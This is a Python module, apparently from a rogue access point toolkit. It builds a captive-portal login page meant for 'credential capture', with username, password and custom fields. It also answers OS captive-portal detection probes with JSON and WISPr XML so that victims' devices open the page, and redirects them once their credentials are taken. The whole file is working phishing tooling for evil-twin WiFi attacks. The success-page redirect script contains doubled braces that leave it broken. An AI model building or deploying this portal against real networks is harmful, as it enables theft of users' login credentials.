"""CaptivePortal – generate login pages, serve templates, and handle redirects.

Provides a high-level interface for building captive-portal experiences:
template generation with variable substitution, page customisation, and
captive-portal detection helper (RFC 8910 / RFC 7710 style).
"""

import json
import os
import string
from typing import Dict, List, Optional

from wifi_aio.exceptions import WiFiConnectionError
from wifi_aio.logger import get_logger

logger = get_logger("rogue.captive_portal")


class CaptivePortal:
    """Build and manage a captive-portal experience.

    Parameters
    ----------
    template_dir:
        Directory containing HTML template files.  If ``None`` built-in
        templates are used.
    ssid:
        SSID displayed in the portal page.
    redirect_url:
        URL to redirect the client to after successful credential capture.
    custom_fields:
        Additional form field names to include in the login page.
    """

    def __init__(
        self,
        template_dir: Optional[str] = None,
        ssid: str = "WiFi",
        redirect_url: str = "http://www.example.com",
        custom_fields: Optional[List[str]] = None,
    ) -> None:
        self.template_dir = template_dir
        self.ssid = ssid
        self.redirect_url = redirect_url
        self.custom_fields = custom_fields or []
        self._templates: Dict[str, str] = {}
        self._load_templates()

    # ── Template loading ───────────────────────────────────────────────

    def _load_templates(self) -> None:
        """Load built-in templates and override from template_dir if set."""
        self._templates = {
            "login": self._builtin_login_template(),
            "success": self._builtin_success_template(),
            "error": self._builtin_error_template(),
            "terms": self._builtin_terms_template(),
        }

        if self.template_dir and os.path.isdir(self.template_dir):
            for name in list(self._templates.keys()):
                path = os.path.join(self.template_dir, f"{name}.html")
                if os.path.isfile(path):
                    with open(path, "r", encoding="utf-8") as fh:
                        self._templates[name] = fh.read()
                    logger.debug("Loaded custom template: %s", path)

    # ── Page generation ────────────────────────────────────────────────

    def generate_login_page(self, **context: str) -> str:
        """Generate the login/credential-capture HTML page.

        Additional key-word arguments are substituted into the template
        using ``string.Template`` safe_substitute.
        """
        fields_html = self._generate_fields_html()
        ctx = {
            "ssid": self.ssid,
            "redirect_url": self.redirect_url,
            "custom_fields": fields_html,
            **context,
        }
        template = string.Template(self._templates["login"])
        return template.safe_substitute(ctx)

    def generate_success_page(self, **context: str) -> str:
        """Generate a post-login success page."""
        ctx = {
            "ssid": self.ssid,
            "redirect_url": self.redirect_url,
            **context,
        }
        template = string.Template(self._templates["success"])
        return template.safe_substitute(ctx)

    def generate_error_page(self, error_message: str = "Login failed", **context: str) -> str:
        """Generate an error page shown after a failed login attempt."""
        ctx = {
            "ssid": self.ssid,
            "error_message": error_message,
            **context,
        }
        template = string.Template(self._templates["error"])
        return template.safe_substitute(ctx)

    def generate_terms_page(self, **context: str) -> str:
        """Generate a terms-of-service page."""
        ctx = {
            "ssid": self.ssid,
            **context,
        }
        template = string.Template(self._templates["terms"])
        return template.safe_substitute(ctx)

    # ── Captive-portal detection helpers ───────────────────────────────

    def generate_captive_json(self, ap_ip: str = "10.0.0.1") -> str:
        """Generate a JSON payload for captive-portal detection endpoints.

        Many OS captive-portal detectors expect a specific JSON response;
        this returns a compatible payload.
        """
        payload = {
            "captive": True,
            "portal_url": f"http://{ap_ip}/login",
            "venue_info": {"name": self.ssid},
        }
        return json.dumps(payload)

    def generate_wispr_xml(self, ap_ip: str = "10.0.0.1") -> str:
        """Generate a WISPr XML response for captive-portal detection.

        WISPr (Wireless Internet Service Provider roaming) is used by
        many clients to detect captive portals.
        """
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<WISPAccessGatewayParam xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:noNamespaceSchemaLocation="http://www.wballiance.net/wispr_2_0.xsd">
  <Redirect>
    <MessageType>100</MessageType>
    <ResponseCode>0</ResponseCode>
    <AccessProcedure>1.0</AccessProcedure>
    <AccessLocation>{self.ssid}</AccessLocation>
    <LoginURL>http://{ap_ip}/login</LoginURL>
    <AbortLoginURL>http://{ap_ip}/</AbortLoginURL>
  </Redirect>
</WISPAccessGatewayParam>"""

    # ── Custom template management ─────────────────────────────────────

    def register_template(self, name: str, html: str) -> None:
        """Register or override a named template with raw HTML."""
        self._templates[name] = html
        logger.debug("Registered custom template: %s", name)

    def list_templates(self) -> List[str]:
        """Return the names of all registered templates."""
        return sorted(self._templates.keys())

    def get_template(self, name: str) -> Optional[str]:
        """Return the raw HTML for a named template, or ``None``."""
        return self._templates.get(name)

    # ── Internals ──────────────────────────────────────────────────────

    def _generate_fields_html(self) -> str:
        """Build HTML input elements for each custom field."""
        parts: List[str] = []
        for field in self.custom_fields:
            label = field.replace("_", " ").title()
            field_type = "password" if "pass" in field.lower() else "text"
            parts.append(
                f'<label>{label}: <input type="{field_type}" name="{field}"></label><br><br>'
            )
        return "\n".join(parts)

    # ── Built-in templates ─────────────────────────────────────────────

    @staticmethod
    def _builtin_login_template() -> str:
        return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>$ssid - WiFi Login</title>
<style>
  body{font-family:Arial,sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
  .card{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:320px}
  h2{margin-top:0;color:#333}
  input[type=text],input[type=password]{width:100%;padding:8px;margin:4px 0 12px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
  input[type=submit]{width:100%;padding:10px;background:#0078d7;color:#fff;border:none;border-radius:4px;cursor:pointer}
  input[type=submit]:hover{background:#005fa3}
</style>
</head>
<body>
<div class="card">
  <h2>$ssid</h2>
  <form method="POST" action="/login">
    <label>Username</label>
    <input type="text" name="username" placeholder="Enter username" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter password" required>
    $custom_fields
    <input type="submit" value="Connect">
  </form>
</div>
</body>
</html>"""

    @staticmethod
    def _builtin_success_template() -> str:
        return """<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Connected</title></head>
<body>
<h2>Successfully connected to $ssid!</h2>
<p>You will be redirected shortly...</p>
<script>setTimeout(function(){{window.location='$redirect_url';}},2000);</script>
</body>
</html>"""

    @staticmethod
    def _builtin_error_template() -> str:
        return """<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Login Error</title></head>
<body>
<h2>$error_message</h2>
<p>Please try again.</p>
<a href="/login">Back to login</a>
</body>
</html>"""

    @staticmethod
    def _builtin_terms_template() -> str:
        return """<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Terms of Service</title></head>
<body>
<h2>Terms of Service - $ssid</h2>
<p>By using this network you agree to the terms and conditions of service.</p>
<a href="/login">Accept and Continue</a>
</body>
</html>"""
